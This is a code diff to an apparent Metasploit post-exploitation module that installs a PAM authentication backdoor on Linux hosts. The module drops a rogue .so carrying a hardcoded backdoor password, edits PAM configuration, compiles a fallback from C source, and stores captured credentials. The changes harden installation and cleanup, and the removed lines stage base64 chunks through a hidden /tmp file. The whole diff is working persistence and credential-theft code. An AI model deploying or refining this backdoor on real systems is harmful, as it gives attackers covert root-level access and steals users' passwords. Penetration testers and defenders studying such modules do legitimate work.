@@ -118,6 +118,12 @@ class MetasploitModule < Msf::Post
                 "BACKDOOR_PASS is #{pass.bytesize} bytes; maximum is #{MAX_PASS_LEN}")
     end
 
+    unless so_name_valid?(datastore['SO_NAME'])
+      fail_with(Failure::BadConfig,
+                "SO_NAME must be a simple filename like 'pam_audit.so' " \
+                "(got: #{datastore['SO_NAME'].inspect})")
+    end
+
     case action.name
     when 'Install' then do_install
     when 'Cleanup' then do_cleanup
@@ -126,7 +132,7 @@ class MetasploitModule < Msf::Post
 
   private
 
-  # ── install ────────────────────────────────────────────────────────────────
+  # -- install ----------------------------------------------------------------
 
   def do_install
     so_dir = find_pam_module_dir
@@ -136,6 +142,12 @@ class MetasploitModule < Msf::Post
     fail_with(Failure::NotFound, 'Cannot locate a PAM config file') unless pam_cfg
 
     target_so = "#{so_dir}/#{datastore['SO_NAME']}"
+
+    if file_exist?(target_so)
+      fail_with(Failure::BadConfig,
+                "#{target_so} already exists - refusing to overwrite it. " \
+                'Run ACTION=Cleanup first or choose a different SO_NAME.')
+    end
 
     case choose_deploy_method
     when :precompiled
@@ -183,7 +195,8 @@ class MetasploitModule < Msf::Post
 
   def deploy_precompiled(target_so)
     binary = patch_placeholder(File.binread(X64_SO_PATH))
-    upload_binary(target_so, binary)
+    # write_file is binary-safe for both meterpreter and shell sessions
+    fail_with(Failure::Unknown, "Could not write #{target_so}") unless write_file(target_so, binary)
     create_process('chown', args: ['root:root', target_so])
     chmod(target_so, 0o644)
     fail_with(Failure::Unknown, 'Could not upload pre-compiled .so') unless file_exist?(target_so)
@@ -202,18 +215,16 @@ class MetasploitModule < Msf::Post
     patched
   end
 
-  def upload_binary(remote_path, data)
-    if session.type == 'meterpreter'
-      write_file(remote_path, data)
-    else
-      # Shell session: base64-encode in chunks, reassemble on target
-      encoded = [data].pack('m0') # strict base64, no newlines
-      tmpb64 = "/tmp/.#{Rex::Text.rand_text_hex(8)}.b64"
-      rm_f(tmpb64)
-      encoded.scan(/.{1,500}/).each do |chunk|
-        create_process('/bin/sh', args: ['-c', "printf '%s' '#{chunk}' >> #{tmpb64}"])
+  # Escape a string for embedding inside a C string literal so passwords
+  # containing quotes, backslashes, or control characters still compile on
+  # the gcc fallback path
+  def c_escape(str)
+    str.gsub(/[\x00-\x1f\x7f"\\]/) do |c|
+      if c == '"' || c == '\\'
+        "\\#{c}"
+      else
+        format('\\%03o', c.ord)
       end
-      create_process('/bin/sh', args: ['-c', "base64 -d #{tmpb64} > #{remote_path}; rm -f #{tmpb64}"])
     end
   end
 
@@ -226,7 +237,16 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::BadConfig, "PAM C source not found: #{C_SRC_PATH}")
     end
 
-    src_code = File.read(C_SRC_PATH).gsub(PLACEHOLDER, datastore['BACKDOOR_PASS'])
+    # The C source holds the password in a fixed 64-byte array, so the
+    # escaped form must still fit the placeholder length
+    c_pass = c_escape(datastore['BACKDOOR_PASS'])
+    if c_pass.bytesize > MAX_PASS_LEN
+      fail_with(Failure::BadConfig,
+                "BACKDOOR_PASS is #{c_pass.bytesize} bytes once C-escaped; " \
+                "maximum is #{MAX_PASS_LEN}")
+    end
+
+    src_code = File.read(C_SRC_PATH).gsub(PLACEHOLDER) { c_pass }
     write_file(src, src_code)
 
     libpam = find_libpam
@@ -285,7 +305,7 @@ class MetasploitModule < Msf::Post
     vprint_status("Inserted: #{backdoor_line.strip}")
   end
 
-  # ── cleanup ────────────────────────────────────────────────────────────────
+  # -- cleanup ----------------------------------------------------------------
 
   def do_cleanup
     so_dir = find_pam_module_dir
@@ -301,14 +321,21 @@ class MetasploitModule < Msf::Post
       print_warning("PAM module not found on target: #{target_so || so_name}")
     end
 
-    strip_pam_config(pam_cfg, so_name) if pam_cfg && file_exist?(pam_cfg)
+    strip_pam_config(pam_cfg, target_so) if pam_cfg && file_exist?(pam_cfg)
 
     print_good('Cleanup complete')
   end
 
-  def strip_pam_config(config_path, so_name)
+  # Remove only the line referencing the exact installed .so path so
+  # legitimate PAM directives that merely share the module name survive
+  def strip_pam_config(config_path, target_so)
+    unless target_so
+      print_warning('Cannot determine the installed .so path - skipping PAM config restore')
+      return
+    end
+
     current = read_file(config_path)
-    cleaned = current.lines.reject { |l| l.include?(so_name) }.join
+    cleaned = current.lines.reject { |l| l.include?(target_so) }.join
     if cleaned == current
       print_status("No backdoor line found in #{config_path}")
     else
@@ -317,7 +344,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # ── credential storage ─────────────────────────────────────────────────────
+  # -- credential storage ----------------------------------------------------
 
   def store_pam_creds
     valid_shells = read_valid_shells
@@ -393,7 +420,7 @@ class MetasploitModule < Msf::Post
     raw =~ /^Port\s+(\d+)/ ? ::Regexp.last_match(1).to_i : 22
   end
 
-  # ── discovery helpers ──────────────────────────────────────────────────────
+  # -- discovery helpers -----------------------------------------------------
 
   def find_pam_module_dir
     PAM_MODULE_DIRS.each do |dir|
@@ -406,6 +433,12 @@ class MetasploitModule < Msf::Post
     return datastore['PAM_CONFIG'] unless datastore['PAM_CONFIG'].to_s.strip.empty?
 
     PAM_CONFIGS.find { |path| file_exist?(path) }
+  end
+
+  # A plain filename only: no separators, no traversal, no hidden files -
+  # SO_NAME ends up inside PAM config lines and remote paths
+  def so_name_valid?(so_name)
+    so_name =~ /\A[A-Za-z0-9][A-Za-z0-9._-]*\z/ ? true : false
   end
 
 end
